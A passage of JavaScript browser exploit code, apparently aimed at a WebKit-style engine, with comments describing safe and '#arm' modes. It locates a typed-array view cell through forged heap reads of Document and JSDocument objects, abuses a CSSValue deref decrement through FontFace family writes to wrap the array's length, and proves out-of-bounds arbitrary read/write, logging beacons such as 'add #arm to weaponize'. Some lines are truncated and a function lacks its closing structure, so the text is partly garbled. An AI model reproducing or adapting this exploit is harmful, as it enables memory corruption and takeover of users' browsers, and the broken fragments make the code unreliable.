     FREE expando bridge of p1329/p1345 but with the two fixes those probes

                          (c) identifies WHICH window.__sp[k] it is

       is in B IS m_vector (committed, not assumed).

       equals the victim's real JS byteLength (0xC0) is m_length; its width
       (size_t vs uint32) is read, not guessed, and dictates the dec target.

       0x11_0000_0000) before any forge-read, so we never follow a value into
       execute-only .text (module range 0x8xx..) or an unmapped page.

   MODES (task deliverable 4):
     default        SAFE: locate + validate the view cell, resolve m_length,
                    beacon, STOP.  No destructive write.
     #arm / ?arm=1  perform the decrement that wraps m_length huge, confirm
                    via plain-JS byteLength, then a plain-JS cross-view R/W
                    proof (NO forge-read: writes OOB from the giant view into
                    a second known backing and reads it back natively).

     SELF-0x..                 addr(buf) (forge-read calibration)
     BSET-n<count>             known spray backings in B
     HOLDER-0x..-jt0x..        a self-validated object-cell holder

     MLEN-0x..-WIDTH-<8|4>     resolved length field + width

     LEN-DEC-FIRE-0x..-x<n>    (arm) n decrements fired at the length field

    is one). For each, Document+0x08 = ScriptWrappable::m_wrapper (WeakImpl*) ->
    *(impl) = JSDocument; validate by the expando signature (scanContainer). */
 var docCands=[], dcs={};
 for(var fo=-0x28; fo<=0x40 && docCands.length<8; fo+=8){ var seg=rdH(FF+BigInt(fo),0x10); if(seg==='')continue; var mm=qAt(seg,0); if(!heap(mm))continue; var mh=rdH(mm,0x10); if(mh==='')continue; if(isMV(qAt(mh,0))){ var kk=mm.toString(16); if(!dcs[kk]){ dcs[kk]=1; docCands.push(mm); B('DOCCAND-0x'+mm.toString(16),'FF'+(fo<0?'':'+')+'0x'+Math.abs(fo).toString(16)); } } }
 for(var dci=0; dci<docCands.length && VC===0n; dci++){ var D=docCands[dci];
   /* D = m_scriptExecutionContext = the Document's SECONDARY (ScriptExecutionContext)
      sub-object. Recover the primary via offset-to-top (vtable-0x10), then
      m_wrapper @ primary+0x08 -> WeakImpl -> JSDocument (holds our expandos). */
   var _dvh=rdH(D,0x10), _vptr=(_dvh!=='')?qAt(_dvh,0):0n;
   if(isMV(_vptr)){ var _otoH=rdRaw(_vptr-0x10n,8);
     if(_otoH!==''){ var _u=qAt(_otoH,0), _oto=(_u>=0x8000000000000000n)?(_u-0x10000000000000000n):_u, Dp=D+_oto;
       B('DPRIM-0x'+Dp.toString(16),'oto_'+(_oto<0n?'-0x'+(-_oto).toString(16):'0x'+_oto.toString(16)));
       if(heap(Dp)){ var _mwH=rdH(Dp+0x08n,0x10), _mw=(_mwH!=='')?qAt(_mwH,0):0n;
         if(heap(_mw)){ var _jH=rdH(_mw,0x10);
           if(_jH!==''){ var rr=scanContainer(qAt(_jH,0)); if(rr===0n) rr=scanContainer(qAt(_jH,8));
             if(rr!==0n){ VC=rr; B('JSDOC-prim-0x'+Dp.toString(16),'via offset-to-top'); } } } } } }
   if(VC!==0n) break;
   for(var o=0; o<=0x20 && VC===0n; o+=8){ var dd=rdH(D+BigInt(o),0x10); if(dd==='')continue; var q=qAt(dd,0); if(!heap(q))continue;
     var r=scanContainer(q); if(r!==0n){ VC=r; B('JSDOC-D0x'+D.toString(16)+'-o0x'+o.toString(16)+'-direct',''); break; }
     var qd=rdH(q,0x10); if(qd==='')continue;
     var r2=scanContainer(qAt(qd,0)); if(r2!==0n){ VC=r2; B('JSDOC-D0x'+D.toString(16)+'-o0x'+o.toString(16)+'-weak0',''); break; }
     var r3=scanContainer(qAt(qd,8)); if(r3!==0n){ VC=r3; B('JSDOC-D0x'+D.toString(16)+'-o0x'+o.toString(16)+'-weak8',''); break; }
   }
 }
 if(VC===0n){ restoreAll(SAFE_SNAP); B('NO-VC','no sp[] view cell via '+docCands.length+' doc-cands from FF=0x'+FF.toString(16)+' - fresh-open'); S('no view cell - fresh-open','#4a2a12'); try{document.fonts.add(W);}catch(e){} return; }
 B('VC-FOUND-0x'+VC.toString(16),'document expando, m_vector@+0x'+mvOff.toString(16));
 S('VIEW CELL located (document expando)','#0a7a2a');

 /* ---- (6) resolve m_length offset + width against the victim's real JS
         byteLength (self-validation, read-only) ---- */
 var vh=rdH(VC,0x30);
 var expLen=BigInt(matched.o.byteLength);                   /* 0xC0 for Uint8Array(ArrayBuffer(192)) */
 var lenOff=-1, width=0, decTgt=0n, decCalls=0, mlenRaw=0n;
 var tryOff=[mvOff+8, 0x18, 0x1C, 0x20];
 for(var ti=0; ti<tryOff.length; ti++){ var LO=tryOff[ti]; if(LO+8>0x30)continue;
   var q=qAt(vh,LO), lo=q&0xFFFFFFFFn, hi=q>>32n;
   if(lo===expLen && hi===0n){ lenOff=LO;width=8;decTgt=VC+BigInt(LO+4);decCalls=1;mlenRaw=q;break; }   /* size_t, high=0 */
   if(lo===expLen){ lenOff=LO;width=4;decTgt=VC+BigInt(LO);decCalls=0x61;mlenRaw=q;break; }             /* uint32 */
 }

 B('MLEN-0x'+mlenRaw.toString(16)+'-WIDTH-'+width,'off0x'+lenOff.toString(16)+' decTgt0x'+decTgt.toString(16)+' x'+decCalls);

 if(!ARMED){ restoreAll(SAFE_SNAP); B('SAFE-DONE','view cell controlled + length field resolved. Re-run with #arm to wrap.'); S('SAFE-DONE - add #arm to weaponize','#0a7a2a'); try{document.fonts.add(W);}catch(e){} return; }

 /* ================= ARMED: wrap m_length, prove arbitrary R/W ================= */
 /* switch buf from forge-read shape to the P1310 decrement shape: m_family
    (buf+0x18) = tgtAddr; each W.family= runs CSSValue::deref() twice (-2). */
 function fireDec(tgtAddr,times){
   restoreAll(SAFE_SNAP);
   for(var i3=0x58;i3<0x68;i3++)buf[i3]=0; wq(buf,0x08,L1); buf[0x10]=0; wq(buf,0x18,tgtAddr); buf[0x82]=3;
   try{ document.fonts.add(W); }catch(e){}
   var f=0; for(var t=0;t<times;t++){ try{ W.family='z'+(t&0x7FFF); f++; }catch(e){ break; } }
   return f;

 function bl(){ try{ return matched.o.byteLength; }catch(e){ return 0; } }

 var f1=fireDec(decTgt,decCalls);

 /* width self-correction: a WIDTH-8 guess can be a uint32 field padded with a
    zero dword. If the high-dword wrap didn't move byteLength, wrap the low
    dword instead (still 0x..C0, unchanged). This removes the only guessed bit. */

   var dt2=VC+BigInt(lenOff);
   var f2=fireDec(dt2,0x61);
   B('LEN-DEC-FIRE-0x'+dt2.toString(16)+'-x'+f2,'fallback-uint32-lowdword');
   nb=bl();
 }
 var nbh=(nb>>>0).toString(16); if(nb>0xFFFFFFFF) nbh=nb.toString(16);
 if(nb>0x1000000){ B('LEN-WRAPPED-0x'+nbh,'victim __sp['+matched.idx+'] byteLength now huge'); S('LEN-WRAPPED - giant view live','#0a7a2a'); }
 else { restoreAll(SAFE_SNAP); B('LEN-WRAP-MISS-0x'+nbh,'byteLength not huge after both widths; try FastTypedArray victim (new Uint8Array(192))'); try{document.fonts.add(W);}catch(e){} return; }

 /* cross-view R/W proof (NO forge-read): pick a 2nd known backing ABOVE the
    victim, write OOB from the giant view, read it back natively. */
 var tgt=null; for(var gi=0;gi<BK.length;gi++){ if(BK[gi].a>matched.a){ if(!tgt||BK[gi].a<tgt.a) tgt=BK[gi]; } }
 if(!tgt){ B('ARW-NO-TGT','no backing above victim; widen B'); return; }
 var idxB=tgt.a-matched.a, idx=Number(idxB);
 try{ tgt.o[0]=0x11; }catch(e){}
 var ok=false; try{ matched.o[idx]=0xAB; matched.o[idx+1]=0xCD; ok=true; }catch(e){ B('ARW-WRITE-ERR',(''+(e&&e.message||e)).slice(0,40)); }
 if(ok){ var rb0=0,rb1=0; try{ rb0=tgt.o[0]; rb1=tgt.o[1]; }catch(e){}
   if(rb0===0xAB&&rb1===0xCD){ B('ARW-PROOF-0x'+rb0.toString(16)+rb1.toString(16)+'-at0x'+tgt.a.toString(16),'OOB write from __sp['+matched.idx+'] landed in __sp['+tgt.idx+'] idx0x'+idx.toString(16)); S('ARW-PROOF - base-free arbitrary R/W (Step 10)','#7a0a5a'); }
   else{ B('ARW-MISS-0x'+rb0.toString(16)+rb1.toString(16),'expected abcd (idx0x'+idx.toString(16)+') - ArrayBuffer secondary bound? use FastTypedArray victim'); } }
 B('DONE','armed path complete');
}
